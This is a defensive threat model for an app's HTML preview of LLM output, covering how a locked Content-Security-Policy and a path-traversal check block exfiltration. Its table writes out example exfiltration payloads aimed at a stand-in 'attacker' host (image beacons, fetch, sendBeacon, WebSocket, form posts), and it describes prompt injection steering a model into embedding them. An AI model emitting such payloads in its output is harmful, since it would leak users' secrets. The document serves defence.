# HTML Preview — Threat Model

**Scope:** the Writ preview surface (ADR-009, lean re-scope; supersedes the
trust apparatus of ADR-010/011).
**Status:** current as of the L3 verification suite.

## What the preview is for

The preview renders **Writ's own offline agent/LLM output and prompt
results**, for readability. It is explicitly **not** a safe renderer for
hostile web pages, and it is not a browser. The single design fact that
everything below rests on:

> **Network egress is categorically off, forever.**

That one constraint dissolves the conventional HTML-preview trust problem.
There is no per-document trust, no pin store, no audit log, no per-buffer
scripts/network toggle — those were designed (ADR-011) for a renderer that
*could* reach the network and were cut when network was cut.

## Assets

- **The user's own content** in the previewed buffer — often sensitive
  prompt data, API keys pasted into a scratch buffer, internal text. This is
  the asset an attacker would want to exfiltrate.
- **The host machine** — the filesystem, clipboard, other Writ buffers.

## Adversary

- **Prompt-injected or malicious agent output.** The user previews text an
  LLM produced; that text may have been steered by a prompt-injection
  attack to embed an exfiltration payload (`<img src=https://attacker/?…>`,
  `fetch()`, a tracking pixel, a beacon). The user's threat model is "I'm
  reading what the model wrote."
- The adversary does **not** have local code execution or filesystem
  access. Those are out of scope (an attacker with the user's privileges has
  already won, independent of the preview).

## Exfiltration channels and how each is closed

The boundary is the **fixed document Content-Security-Policy**, attached as
a response header by the `writ-preview://` protocol handler to every
document response. The locked bytes (scripts-on form):

```
default-src 'none';
script-src 'unsafe-inline' 'self' writ-preview:;
style-src 'unsafe-inline' 'self' writ-preview:;
img-src data: writ-preview:;
font-src data: writ-preview:;
media-src data: writ-preview:;
connect-src 'none'; object-src 'none'; frame-src 'none';
worker-src 'none'; form-action 'none'; base-uri 'none';
frame-ancestors 'self'; navigate-to 'none';
```

| Channel | Vector | Closed by |
|---|---|---|
| Image beacon | `<img src="https://attacker/?secret">` | `img-src data: writ-preview:` — no remote scheme |
| Scripted fetch | `fetch('https://attacker/', {body: secret})` | `connect-src 'none'` |
| Beacon API | `navigator.sendBeacon('https://attacker/', secret)` | `connect-src 'none'` |
| WebSocket | `new WebSocket('wss://attacker/')` | `connect-src 'none'` |
| Remote font | `@font-face { src: url('https://attacker/?…') }` | `font-src data: writ-preview:` |
| Remote stylesheet | `@import url('https://attacker/?…')` | `style-src` has no remote scheme |
| Navigation exfil | `<meta http-equiv=refresh>`, `window.location` | `navigate-to 'none'`, `base-uri 'none'` |
| Form post | `<form action="https://attacker/">` | `form-action 'none'` |
| Plugin / embed | `<object>`, `<embed>` | `object-src 'none'` |
| Nested frame | `<iframe src=…>` | `frame-src 'none'` |

`http:` is no more permitted than `https:` — neither scheme appears in any
directive. `data:` and `writ-preview:` are the only non-keyword sources, and
neither can reach the network: `data:` is inline, and `writ-preview:` is the
host's own protocol, served only the bundled chrome assets and the current
buffer's rendered HTML (see the scope boundary below).

### Why scripts can be on

Scripts default **on** so interactive agent output works — sliders,
checkboxes, and (from L5/L6) Mermaid and KaTeX. A prompt-injected script
*runs*, but it has no egress: `connect-src 'none'` blocks `fetch`/XHR/
`WebSocket`/`sendBeacon`, and the resource directives admit no remote
scheme, so it cannot construct an exfiltrating subresource either. The
app-level `preview.run_scripts` kill switch flips `script-src` to `'none'`
for users who want belt-and-suspenders; it does not change the network
posture, which is off either way.

## The `writ-preview://` scope boundary

The protocol has two scopes: `chrome` (host-owned bundled assets) and
`document` (the user's rendered buffer). The chrome scope runs `'self'`
scripts (it will host the Mermaid/KaTeX runtimes); the document scope must
never be able to reach into it. The parser
(`writ_core::preview::protocol::parse`) refuses any request that, after a
single percent-decode and backslash-normalisation, contains a `..` segment
— so `writ-preview://document/../chrome/x` and its encoded and Windows-slash
variants are refused before any I/O. This is the one boundary the
disposition recorder genuinely observes, and the verification suite asserts
it directly.

## Verification

The boundary is proven in-repo, on every PR (the merge gates), plus a
nightly fuzz job:

- **Exfil denial — CSP semantics.** `src-tauri/tests/preview_security.rs`
  evaluates the locked document CSP against each of the six exfil vectors
  with an independent CSP evaluator (`preview::csp_eval`) and asserts
  `Deny`. The evaluator is validated against *independent oracle policies*
  (e.g. `img-src https:` allows https, `img-src 'none'` denies it,
  `img-src 'self'` denies cross-origin) so it implements real CSP semantics
  rather than merely agreeing with our policy string — a deny-everything
  stub fails the allow-class assertions. **Why CSP semantics and not the
  recorder:** a remote exfil request never reaches the protocol handler
  (the webview blocks it at CSP-enforcement time), so the disposition
  recorder structurally cannot witness it. The boundary against exfil *is*
  the CSP; the test proves the CSP bytes deny each vector.
- **Scope/traversal — disposition recorder.** The same suite drives URLs
  through the real `resolve()` pipeline and asserts the recorded
  disposition: document→chrome traversal (plain, encoded, double-encoded,
  backslash), null bytes, and bad encodings are `Refused`; legitimate
  same-scope requests are `Allowed`.
- **Parser fuzzing.** `fuzz/fuzz_targets/preview_url_parser.rs` fuzzes
  `parse` for "never panics" and "no traversal survives into an accepted
  request." A stable-toolchain property test
  (`crates/writ-core/tests/preview_url_parser_property.rs`) enforces the
  same invariants over the committed seed corpus and a generated adversarial
  bank, so the guarantee is a green merge gate, not only a nightly job.
  Latest local run: 10.6M executions, 0 crashes.

## Residual risks — explicitly accepted

The verification proves *our* code denies these channels. It rests on one
assumption we do not (and cannot, in-repo) verify:

- **We trust the webview engine to enforce the attached CSP per spec.** The
  CSP is a response header; WebKit (macOS), WebKit2GTK (Linux), and WebView2
  (Windows) enforce it. A CSP-enforcement bypass — a 0-day in the engine
  that lets a document fetch a remote resource the policy forbids — would
  defeat the boundary. This is **out of scope**; the mitigation is OS
  sandboxing and timely Tauri/engine upgrades. This is the honest location
  of "behavioral" verification: cross-platform, real-engine confirmation
  that the attached CSP is enforced as written is the job of the
  release-PR CI matrix (which runs the full suite on all three engines),
  not of the in-repo unit gates.
- **A user who pastes secrets into a buffer and runs an injected script that
  manipulates the visible DOM** can mislead the user visually (it cannot
  exfiltrate). Phishing-by-rendered-content is not defended against beyond
  the network boundary; the user is previewing their own content.
- **Local-filesystem attackers** (an actor with the user's privileges) are
  out of scope, as above.

## Change control

The locked CSP bytes are asserted by byte-equality tests
(`src-tauri/src/preview/csp.rs`). Any change to them is a deliberate
security decision and will fail those tests until updated — that failure is
the gate that forces the decision to be conscious. The exfil suite then
re-proves denial against the new bytes.
